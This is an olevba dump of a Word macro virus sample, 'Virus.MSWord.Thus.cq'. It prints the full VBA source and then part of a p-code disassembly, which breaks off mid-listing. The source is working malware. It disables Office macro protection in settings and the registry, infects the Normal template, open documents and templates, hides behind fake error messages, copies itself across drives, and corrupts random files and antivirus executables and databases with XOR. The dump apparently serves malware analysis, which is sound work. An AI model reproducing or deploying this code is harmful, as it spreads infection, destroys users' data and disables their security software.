olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus.cq
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus.cq - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Thus_001'
'NIST_32a'
Private Declare Function CopyFile& Lib "kernel32" Alias "CopyFileA" (ByVal _
    lpExistingFileName As String, ByVal lpNewFileName As String, ByVal _
    bFailIfExists As Long)

Private Sub CommandButton1_Click()

End Sub

Private Sub Document_Open()
Dim Res As String, x As String, k As Integer, Sd As Boolean, Nt As Boolean
    On Error Resume Next

With Application
    .EnableCancelKey = 0
    .ScreenUpdating = False
    .Options.VirusProtection = Chr(3696 / 7 / 11)
    .Options.ConfirmConversions = Chr(8976 / 11 / 17)
    .Options.SaveNormalPrompt = Chr(1872 / 3 / 13)
    .Options.SavePropertiesPrompt = Chr(9072 / 9 / 21)
    .DefaultSaveFormat = ""
    .DisplayAlerts = 0
    .DisplayStatusBar = Chr(48)
End With
         WordBasic.DisableAutoMacros 0
    If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1), 9) <> "'NIST_32a" Then
     NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
    .CodeModule.CountOfLines
    Nt = -1
    End If
         Randomize
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
    .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
    .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    For k = 1 To Application.Documents.Count
    If Left(Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1), 9) <> "'NIST_32a" Then
    Sd = Application.Documents.Item(k).Saved
    Application.Documents.Item(k).ReadOnlyRecommended = Chr(48)
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
    .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
    .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
    .VBComponents.Item(1).CodeModule.CountOfLines)
    If (Sd) And (Dir(Application.Documents.Item(k).FullName, 7) <> "") Then Application.Documents.Item(k).Save
    End If
    Next k
    For k = 1 To Application.Templates.Count
    If Left(Application.Templates.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1), 9) <> "'NIST_32a" Then
    Application.Templates.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.DeleteLines 1, Application.Templates.Item(k) _
    .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If
    If Application.Templates.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    Application.Templates.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
    .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
    .VBComponents.Item(1).CodeModule.CountOfLines)
    End If
    Next k
    If Nt Then Exit Sub
Dpio
If ActiveDocument.SaveFormat < 2 Then
    If (ActiveDocument.Saved = False) And (ActiveDocument.ReadOnly = False) Then
       If Dir(ActiveDocument.FullName, 7) = "" Then
       ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, ReadOnlyRecommended:=0
       Else: ActiveDocument.Save
       End If
       ActiveDocument.Saved = False
    End If
Rcy ActiveDocument.FullName
End If
Asd
Res = Rdr(Chr(Int((Gds() * Rnd) + 1) + 66) & Chr(58) & Chr(92))
If Res <> "" Then x = Rfe(Res, "*.*")
If x <> "" Then Res = Res & x Else Res = ""
If Res <> "" Then Dfe Res
    Application.ScreenUpdating = True
    Application.EnableCancelKey = 1
    Application.DisplayAlerts = -1
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub
Private Sub AutoExec()
    Document_Open
End Sub
Private Sub AutoExit()
    Document_Open
End Sub
Private Sub FileOpen()
On Error GoTo Fo
With Dialogs(80)
    .Display
If .Name <> "" Then
     SetAttr .Name, 0
    .ReadOnly = Chr(48)
    .ConfirmConversions = 0
    .Execute
End If
End With
Fo:
End Sub
Private Sub AutoSave()
    Document_Open
End Sub
Private Sub Auto_Save()
    Document_Open
End Sub
Private Sub ToolsMacro()
Document_Open
MsgBox "File VBADLG.DLL not found", 16
End Sub
Private Sub ViewVBCode()
Document_Open
MsgBox "File VBADLG.DLL not found", 16
End Sub
Private Sub FileTemplates()
Document_Open
MsgBox "Global template not loaded", 16
End Sub
Private Sub ToolsOptions()
    Application.Options.VirusProtection = Chr(49)
    Dialogs(wdDialogToolsOptions).Show
    Application.Options.VirusProtection = Chr(48)
End Sub
Private Function Gds() As Byte
Const Rt = ":\"
Dim FileNum As Integer
Dim St As String
Dim i As Byte, k As Byte
On Error GoTo Ext
    For i = 1 To 27
    St = Chr(66 + i) & Rt & Chr(96)
    FileNum = FreeFile
     Open St For Binary As #FileNum
     Close #FileNum
     Kill St
     k = k + 1
    Next i
Ext:
    Gds = k
End Function
Private Function Rdd(ByVal Path As String) As String
Const Maska = "*.*"
Dim n As Integer, i As Integer
Dim Buf(1 To 4000) As String
Dim FindNmi As String
       n = 0
       i = 1
If Right(Path, 1) <> "\" Then Path = Path & "\"
On Error GoTo Errs
  FindNmi = Dir(Path, 23)
  Do While FindNmi <> ""
    If (GetAttr(Path & FindNmi) And vbDirectory) = vbDirectory Then
        If Mid(FindNmi, 1, 1) <> "." Then
                  n = n + 1
             Buf(i) = FindNmi
                    i = i + 1
        End If
    End If
         FindNmi = Dir
  Loop
        Rdd = UCase(Path & Buf(Int((n * Rnd) + 1)))
Errs:
        If n = 0 Then Rdd = ""
End Function
Private Function Rdr(ByVal Path As String) As String
Const Root = ":"
Dim tmp As String
Dim i As Integer
Dim GetRandom As Integer
Dim RandStep As Integer
   GetRandom = Int((1001 * Rnd) + 1)
     RandStep = 0

   For i = 1 To 10
        tmp = Rdd(Path)
        If tmp <> "" Then Path = tmp
        If (tmp = "") And (i = 1) Then
              Rdr = ""
              Exit Function
        End If
        If (tmp = "") And (i <> 1) Then
              Rdr = Path & "\"
              Exit Function
        End If
    Select Case RandStep
        Case 0 To 200
            RandStep = RandStep + 200
        Case 400 To 600
            RandStep = RandStep + 100
        Case 700 To 900
            RandStep = RandStep + 50
    End Select
        If RandStep >= GetRandom Then
             Rdr = Path & "\"
             Exit Function
        End If
     Next i
End Function
Private Function Rfe(ByVal Path As String, Maska As String) As String
Dim n As Integer, i As Integer
Dim Buf(1 To 4000) As String
Dim FindNmi As String
           n = 0
           i = 1
Path = Path & Maska
  On Error GoTo Errs
  FindNmi = Dir(Path, 7)
  Do While FindNmi <> ""
          n = n + 1
        Buf(i) = FindNmi
            i = i + 1
         FindNmi = Dir
  Loop
        Rfe = UCase(Buf(Int(n * Rnd) + 1))
Errs:
        If n = 0 Then Rfe = ""
End Function
Private Sub Dfe(Path As String)
Dim Attr As Integer
Dim Siz As Long, Cmp As Long
Dim FileNum As Integer
Dim i As Integer
Dim Ofs As Byte
On Error GoTo Ends
    Siz = FileLen(Path)
If Siz < 11 Then Exit Sub
    Attr = GetAttr(Path)
    SetAttr Path, 0
    FileNum = FreeFile
Open Path For Binary As #FileNum
    If Siz < 32763 Then Ofs = 9 Else Ofs = 3
    Get #FileNum, Siz - Ofs, Cmp
If Siz = Cmp Then Exit Sub
    Cmp = Siz
If Siz > 32763 Then Siz = 32763
ReDim Buf(1 To Siz) As Byte
        Rnd (-100)
    Get #FileNum, 10, Buf
    For i = 1 To Siz
    Buf(i) = Buf(i) Xor Int((255 * Rnd) + 0)
    Next i
    Put #FileNum, 10, Buf
        Cmp = Cmp + Ofs
    Put #FileNum, Cmp - Ofs, Cmp
    Close #FileNum
    SetAttr Path, Attr
Ends:
End Sub
Private Sub Rcy(Sours As String)
Dim Fls As String, DirR As String
Dim k As Long, Er As Integer
On Error GoTo YYY
Do
DirR = Rdr(Chr(Int((Gds() * Rnd) + 1) + 66) & Chr(58) & Chr(92))
Fls = Rfe(DirR, "*.*")
Er = Er + 1
If Er > 10 Then Exit Sub
Loop Until Fls <> ""
k = InStr(1, Fls, ".", 1)
If k <> 0 Then
Fls = Left(Fls, Len(Fls) - (Len(Fls) - k) - 1)
End If
Fls = Fls & ".DOC"
DirR = DirR & Fls
k = CopyFile&(Sours, DirR, 0)
YYY:
End Sub
Private Sub Dpio()
Const Path = "\Software\Microsoft\Office\"
Const Ver = "8.0\"
Const NewUse = "New User Settings\"
Const Def = "\.Default"
Dim Keys(1 To 3) As String
Keys(1) = "HKEY_LOCAL_MACHINE"
Keys(2) = "HKEY_CURRENT_USER"
Keys(3) = "HKEY_USERS"
Dim Dis(1 To 3) As String
Dis(1) = "EnableMacroVirusProtection"
Dis(2) = "Options6"
Dis(3) = "MacroVirusProtection"
Dim AddId(1 To 6) As String
AddId(1) = "Word\Options"
AddId(2) = "Excel\Microsoft Excel"
AddId(3) = "PowerPoint\Options"
AddId(4) = "Word\7.0\Options"
AddId(5) = "Excel\7.0\Microsoft Excel"
AddId(6) = "PowerPoint\7.0\Options"
Dim i As Integer
Dim k As Integer
Dim x As Integer
Dim Use As String
On Error Resume Next
With System
Use = .PrivateProfileString("", Keys(1) & "\System\CurrentControlSet\control", "Current User")
If Use <> ".Default" Then x = 3 Else x = 2
For k = 1 To x
For i = 1 To 3
Select Case k
Case 1
.PrivateProfileString("", Keys(k) & Path & Ver & NewUse & AddId(i), Dis(i)) = Chr(48)
.PrivateProfileString("", Keys(k) & "\Software\Microsoft\" & NewUse & AddId(i + 3), Dis(i)) = Chr(48)
Case 2
.PrivateProfileString("", Keys(k) & Path & Ver & AddId(i), Dis(i)) = Chr(48)
.PrivateProfileString("", Keys(k) & "\Software\Microsoft\" & AddId(i + 3), Dis(i)) = Chr(48)
Case 3
.PrivateProfileString("", Keys(k) & Def & Path & Ver & AddId(i), Dis(i)) = Chr(48)
.PrivateProfileString("", Keys(k) & Def & "\Software\Microsoft\" & AddId(i + 3), Dis(i)) = Chr(48)
End Select
Next i
Next k
End With
End Sub
Private Sub Asd()
Const Path1 = "\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Const Path2 = "\System\CurrentControlSet\Services\VxD\SpIDer"
Const Key = "HKEY_LOCAL_MACHINE"
Const RN = "RUNDLL.EXE"
Dim Nmi As String
Dim ProgPath As String
On Error Resume Next
Nmi = Chr(83) & Chr(112) & Chr(73) & Chr(68) & Chr(101) & Chr(114)
With System
ProgPath = .PrivateProfileString("", Key & Path1, Nmi)
If (ProgPath <> "") And (ProgPath <> RN) Then
.PrivateProfileString("", Key & Path1, Nmi) = RN
.PrivateProfileString("", Key & Path2, "StaticVxD") = "*IOS"
ProgPath = Ptd(ProgPath)
Nmi = Dir(ProgPath & "*.EXE", 7)
Do While Nmi <> ""
Dfe (ProgPath & Nmi)
Nmi = Dir
Loop
Nmi = Dir(ProgPath & "*.VDB", 7)
Do While Nmi <> ""
Dfe (ProgPath & Nmi)
Nmi = Dir
Loop
End If
End With
End Sub
Private Function Ptd(Path As String) As String
Dim tmp As String
Dim i As Long, k As Long
On Error GoTo Sti
If Path = "" Then GoTo Sti
k = Len(Path)
For i = k To 1 Step -1
    If Mid(Path, i, 1) = "\" Then Exit For
Next i
Ptd = Left(Path, i)
Exit Function
Sti:
    Ptd = ""
End Function





























































-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Thus.cq
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 21674 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0009 "Thus_001'"
' Line #2:
' 	QuoteRem 0x0000 0x0009 "NIST_32a'"
' Line #3:
' 	LineCont 0x0008 0A 00 04 00 14 00 04 00
' 	FuncDefn (Private Declare Function CopyFile Lib "kernel32" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long))
' Line #4:
' Line #5:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #6:
' Line #7:
' 	EndSub 
' Line #8:
' Line #9:
' 	FuncDefn (Private Sub Document_Open())
' Line #10:
' 	Dim 
' 	VarDefn Res (As String)
' 	VarDefn x (As String)
' 	VarDefn k (As Integer)
' 	VarDefn Sd (As Boolean)
' 	VarDefn Nt (As Boolean)
' Line #11:
' 	OnError (Resume Next) 
' Line #12:
' Line #13:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #14:
' 	LitDI2 0x0000 
' 	MemStWith EnableCancelKey 
' Line #15:
' 	LitVarSpecial (False)
' 	MemStWith ScreenUpdating 
' Line #16:
' 	LitDI2 0x0E70 
' 	LitDI2 0x0007 
' 	Div 
' 	LitDI2 0x000B 
' 	Div 
' 	ArgsLd Chr 0x0001 
' 	MemLdWith Options 
' 	MemSt VirusProtection 
' Line #17:
' 	LitDI2 0x2310 
' 	LitDI2 0x000B 
' 	Div 
' 	LitDI2 0x0011 
' 	Div 
' 	ArgsLd Chr 0x0001 
' 	MemLdWith Options 
' 	MemSt ConfirmConversions 
' Line #18:
' 	LitDI2 0x0750 
' 	LitDI2 0x0003 
' 	Div 
' 	LitDI2 0x000D 
' 	Div 
' 	ArgsLd Chr 0x0001 
' 	MemLdWith Options 
' 	MemSt SaveNormalPrompt 
' Line #19:
' 	LitDI2 0x2370 
' 	LitDI2 0x0009 
' 	Div 
' 	LitDI2 0x0015 
' 	Div 
' 	ArgsLd Chr 0x0001 
' 	MemLdWith Options 
' 	MemSt SavePropertiesPrompt 
' Line #20:
' 	LitStr 0x0000 ""
' 	MemStWith DefaultSaveFormat 
' Line #21:
' 	LitDI2 0x0000 
' 	MemStWith DisplayAlerts 
' Line #22:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	MemStWith DisplayStatusBar 
' Line #23:
' 	EndWith 
' Line #24:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #25:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0009 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0009 "'NIST_32a"
' 	Ne 
' 	IfBlock 
' Line #26:
' 	LineCont 0x0008 0C 00 04 00 1A 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #27:
' 	LitDI2 0x0001 
' 	UMi 
' 	St Nt 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	ArgsCall Read 0x0000 
' Line #30:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #31:
' 	LineCont 0x000C 0C 00 04 00 1A 00 04 00 26 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #34:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	For 
' Line #35:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0009 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0009 "'NIST_32a"
' 	Ne 
' 	IfBlock 
' Line #36:
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Saved 
' 	St Sd 
' Line #37:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt ReadOnlyRecommended 
' Line #38:
' 	LineCont 0x0008 11 00 04 00 1F 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #41:
' 	LineCont 0x000C 11 00 04 00 1C 00 04 00 2B 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #42:
' 	Ld Sd 
' 	Paren 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd FullName 
' 	LitDI2 0x0007 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	NextVar 
' Line #45:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd Templates 
' 	MemLd Count 
' 	For 
' Line #46:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Templates 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0009 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0009 "'NIST_32a"
' 	Ne 
' 	IfBlock 
' Line #47:
' 	LineCont 0x0008 11 00 04 00 1F 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Templates 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Templates 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Templates 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #50:
' 	LineCont 0x000C 11 00 04 00 1C 00 04 00 2B 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Templates 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	NextVar 
' Line #53:
' 	Ld Nt 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #54:
' 	ArgsCall Dpio 0x0000 
' Line #55:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	LitDI2 0x0002 
' 	Lt 
' 	IfBlock 
' Line #56:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #57:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0007 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #58:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	LitDI2 0x0000 
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #59:
' 	ElseBlock 
' 	BoS 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsCall Rcy 0x0001 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	ArgsCall Asd 0x0000 
' Line #66:
' 	ArgsLd Gds 0x0000 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0042 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	ArgsLd Rdr 0x0001 
' 	St Res 
' Line #67:
' 	Ld Res 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Res 
' 	LitStr 0x0003 "*.*"
' 	ArgsLd Rfe 0x0002 
' 	St x 
' 	EndIf 
' Line #68:
' 	Ld x 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Res 
' 	Ld x 
' 	Concat 
' 	St Res 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	St Res 
' 	EndIf 
' Line #69:
' 	Ld Res 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Res 
' 	ArgsCall Dfe 0x0001 
' 	EndIf 
' Line #70:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #71:
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #72:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #73:
' 	EndSub 
' Line #74:
' 	FuncDefn (Private Sub Document_Close())
' Line #75:
' 	ArgsCall Document_Open 0x0000 
' Line #76:
' 	EndSub 
' Line #77:
' 	FuncDefn (Private Sub Document_New())
' Line #78:
' 	ArgsCall Document_Open 0x0000 
' Line #79:
' 	EndSub 
' Line #80:
' 	FuncDefn (Private Sub AutoExec())
' Line #81:
' 	ArgsCall Document_Open 0x0000 
' Line #82:
' 	EndSub 
' Line #83:
' 	FuncDefn (Private Sub AutoExit())
' Line #84:
' 	ArgsCall Document_Open 0x0000 
' Line #85:
' 	EndSub 
' Line #86:
' 	FuncDefn (Private Sub FileOpen())
' Line #87:
' 	OnError Fo 
' Line #88:
' 	StartWithExpr 
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #89:
' 	ArgsMemCallWith Display 0x0000 
' Line #90:
' 	MemLdWith New 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #91:
' 	MemLdWith New 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #92:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	MemStWith ReadOnly 
' Line #93:
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' Line #94:
' 	ArgsMemCallWith Execute 0x0000 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	EndWith 
' Line #97:
' 	Label Fo 
' Line #98:
' 	EndSub 
' Line #99:
' 	FuncDefn (Private Sub AutoSave())
' Line #100:
' 	ArgsCall Document_Open 0x0000 
' Line #101:
' 	EndSub 
' Line #102:
' 	FuncDefn (Private Sub Auto_Save())
' Line #103:
' 	ArgsCall Document_Open 0x0000 
' Line #104:
' 	EndSub 
' Line #105:
' 	FuncDefn (Private Sub ToolsMacro())
' Line #106:
' 	ArgsCall Document_Open 0x0000 
' Line #107:
' 	LitStr 0x0019 "File VBADLG.DLL not found"
' 	LitDI2 0x0010 
' 	ArgsCall MsgBox 0x0002 
' Line #108:
' 	EndSub 
' Line #109:
' 	FuncDefn (Private Sub ViewVBCode())
' Line #110:
' 	ArgsCall Document_Open 0x0000 
' Line #111:
' 	LitStr 0x0019 "File VBADLG.DLL not found"
' 	LitDI2 0x0010 
' 	ArgsCall MsgBox 0x0002 
' Line #112:
' 	EndSub 
' Line #113:
' 	FuncDefn (Private Sub FileTemplates())
' Line #114:
' 	ArgsCall Document_Open 0x0000 
' Line #115:
' 	LitStr 0x001A "Global template not loaded"
' 	LitDI2 0x0010 
' 	ArgsCall MsgBox 0x0002 
' Line #116:
' 	EndSub 
' Line #117:
' 	FuncDefn (Private Sub ToolsOptions())
' Line #118:
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Ld Application 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #119:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #120:
' 	LitDI2 0x0030 
